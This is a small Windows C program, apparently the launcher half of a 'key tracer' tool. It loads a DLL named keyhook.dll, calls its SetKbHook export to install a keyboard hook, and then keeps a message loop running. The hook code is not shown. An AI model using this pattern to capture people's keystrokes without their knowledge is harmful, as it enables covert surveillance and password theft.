#include <windows.h>

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpszCmd, int nChmdShow){
    MSG msg;

    char text[] = "error loading dll!";
    char title[] = "key tracer";

    BOOL error = FALSE;
    HINSTANCE dllhinst; 

    typedef VOID (CALLBACK * LPFNDLLFUNC1)(VOID);
    LPFNDLLFUNC1 lpfnDllFunc1;

    dllhinst = LoadLibrary("keyhook.dll");

    if(dllhinst != NULL){
        lpfnDllFunc1 = (LPFNDLLFUNC1)GetProcAddress(dllhinst, "SetKbHook");
        if(!lpfnDllFunc1){
            FreeLibrary(dllhinst);
            error = TRUE;
        }else{
            lpfnDllFunc1();
        }
    }else
        error = TRUE;

    if(error)
        MessageBox(GetDesktopWindow(), text, title, MB_OK);

    while(GetMessage(&msg, 0, 0, 0)){
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    return msg.wParam;
}
